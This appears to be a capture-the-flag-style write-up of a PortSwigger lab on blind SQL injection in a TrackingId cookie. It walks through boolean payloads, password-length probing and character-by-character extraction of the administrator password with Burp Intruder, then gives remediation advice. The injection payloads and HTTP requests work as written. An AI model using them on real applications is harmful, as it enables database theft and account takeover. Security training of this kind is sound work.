
---
# Blind SQL Injection in TrackingId Cookie allows Administrator Account Compromise

## 1. Executive Summary

A blind SQL injection vulnerability exists in the application's `TrackingId` cookie, allowing an attacker to inject SQL conditions into a backend database query. Although the application does not directly return database query results, differences in the application's response — specifically the presence or absence of the **"Welcome back"** message — allow an attacker to infer Boolean query results and progressively extract the administrator's password.

## 2. Vulnerability Details

- **Vulnerability Type:** Blind SQL Injection — Conditional Responses
    
- **Target Endpoint/URL:** `/`
    
- **Affected Parameter(s):** `TrackingId` cookie
    
- **Authentication Level Required:** Unauthenticated
    
- **Database Interaction:** Application tracking/analytics query
    

The application processes the `TrackingId` cookie through a SQL query.

The attacker can inject a Boolean condition into the cookie:

```
TrackingId=xyz' AND '1'='1
```

When the condition is true, the response contains:

```
Welcome back
```

When the condition is false:

```
TrackingId=xyz' AND '1'='2
```

the message disappears.

This difference creates a **Boolean oracle**, allowing an attacker to ask the database yes/no questions and infer sensitive information without directly seeing SQL query results.

## 3. Steps to Reproduce (STR)

### Step 1 — Confirm the Boolean-based SQL injection

1. Access the PortSwigger lab's front page.
    
2. Intercept the request using Burp Suite.
    
3. Locate the `TrackingId` cookie.
    
4. Assume the original cookie is:
    

```
Cookie: TrackingId=xyz
```

5. Modify it to:
    

```
Cookie: TrackingId=xyz' AND '1'='1
```

6. Forward the request.
    
7. Observe that the response contains **"Welcome back"**.
    
8. Change the cookie to:
    

```
Cookie: TrackingId=xyz' AND '1'='2
```

9. Forward the request.
    
10. Observe that **"Welcome back"** is no longer present.
    
11. This confirms that the application response can be used to determine whether an injected SQL condition evaluates to true or false.
    

### Step 2 — Confirm the `users` table exists

12. Modify the cookie to:
    

```
TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
```

13. Forward the request.
    
14. Observe that **"Welcome back"** appears.
    
15. The true condition confirms that a `users` table exists and contains at least one row.
    

### Step 3 — Confirm the administrator account exists

16. Modify the cookie to:
    

```
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
```

17. Forward the request.
    
18. Observe that **"Welcome back"** appears.
    
19. This confirms that a user named `administrator` exists.
    

### Step 4 — Determine the administrator password length

20. Test whether the administrator password contains more than one character:
    

```
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
```

21. Observe that the condition is true.
    
22. Continue increasing the length:
    

```
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a
```

```
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>3)='a
```

23. Continue until the response no longer contains **"Welcome back"**.
    
24. The last successful comparison identifies the password length.
    
25. In this lab, the administrator password is **20 characters long**.
    

### Step 5 — Extract the password characters

26. Send the request to **Burp Intruder**.
    
27. Modify the `TrackingId` cookie to test the first password character:
    

```
TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
```

28. Place Burp Intruder payload markers around the final `a`:
    

```
TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§
```

29. Configure the Intruder payload type as **Simple list**.
    
30. Add the possible password characters:
    

```
a-z
0-9
```

31. Open the Intruder **Settings**.
    
32. In **Grep - Match**, remove existing entries.
    
33. Add:
    

```
Welcome back
```

34. Launch the Intruder attack.
    
35. Review the results.
    
36. The payload producing a match for **"Welcome back"** represents the first character of the password.
    

### Step 6 — Extract the remaining characters

37. Change the `SUBSTRING()` offset from `1` to `2`:
    

```
TrackingId=xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='§a§
```

38. Run the Intruder attack again.
    
39. Identify the character that produces the **"Welcome back"** response.
    
40. Repeat the process for offsets `3`, `4`, `5`, and so on.
    
41. Continue until all **20 characters** have been identified.
    
42. Combine the extracted characters to reconstruct the administrator password.
    

### Step 7 — Log in as administrator

43. Navigate to **My account**.
    
44. Open the login page.
    
45. Enter:
    

```
Username: administrator
Password: <extracted-password>
```

46. Submit the login form.
    
47. Confirm successful authentication as the administrator.
    

## 4. Proof of Concept (PoC)

### HTTP Request/Response

#### Boolean true condition

```
GET / HTTP/1.1
Host: <LAB-ID>.web-security-academy.net
Cookie: TrackingId=xyz' AND '1'='1
```

The response contains:

```
Welcome back
```

#### Boolean false condition

```
GET / HTTP/1.1
Host: <LAB-ID>.web-security-academy.net
Cookie: TrackingId=xyz' AND '1'='2
```

The response does not contain:

```
Welcome back
```

This establishes the Boolean response oracle.

#### Confirm administrator account

```
GET / HTTP/1.1
Host: <LAB-ID>.web-security-academy.net
Cookie: TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
```

A response containing **"Welcome back"** confirms that the `administrator` account exists.

#### Determine password length

```
GET / HTTP/1.1
Host: <LAB-ID>.web-security-academy.net
Cookie: TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>20)='a
```

The response behavior determines whether the tested length condition is true.

#### Extract an individual character

For the first character:

```
GET / HTTP/1.1
Host: <LAB-ID>.web-security-academy.net
Cookie: TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§
```

Burp Intruder substitutes the `§a§` position with each candidate character.

The correct character produces the response containing:

```
Welcome back
```

The same technique is repeated with:

```
SUBSTRING(password,2,1)
SUBSTRING(password,3,1)
SUBSTRING(password,4,1)
...
SUBSTRING(password,20,1)
```

### Evidence (Screenshots/Video)



## 5. Impact Analysis

- **Technical Impact:** An unauthenticated attacker can exploit the Boolean-based SQL injection to infer information from the database despite the application not directly displaying SQL query results. In this lab, the attacker can determine the administrator password length, extract each password character, reconstruct the complete password, and authenticate as the administrator.
    
- **Business Impact:** Successful exploitation results in complete compromise of a privileged application account. An attacker with administrator access may be able to access sensitive information, modify application data, manage users, and perform other privileged operations.
    

The critical aspect of this vulnerability is that **the absence of direct database output does not prevent data extraction**. The application's response behavior itself provides enough information to reconstruct sensitive database values.

## 6. Remediation & References

- **Suggested Fix:** Use parameterized queries/prepared statements for all SQL operations involving user-controlled input. The `TrackingId` value must be treated strictly as data and must never be incorporated directly into a SQL statement.
    

Example:

```
cursor.execute(
    "SELECT TrackingId FROM TrackedUsers WHERE TrackingId = %s",
    (tracking_id,)
)
```

Additional defenses include:

- Use prepared statements/parameterized queries.
    
- Never concatenate cookies or other user-controlled values directly into SQL.
    
- Apply least-privilege permissions to the database account.
    
- Avoid exposing distinguishable response behavior based on database query results where possible.
    
- Store passwords using strong, salted password-hashing algorithms.
    
- Implement rate limiting and monitoring for suspicious repeated requests.
    
- Avoid exposing database errors or internal query behavior to clients.
    

- **References:**
    
    - OWASP Top 10: A03 — Injection
        
    - OWASP SQL Injection Prevention Cheat Sheet
        
    - CWE-89: Improper Neutralization of Special Elements used in an SQL Command (SQL Injection)
        
    - CWE-307: Improper Restriction of Excessive Authentication Attempts
        
    - PortSwigger Web Security Academy — Blind SQL Injection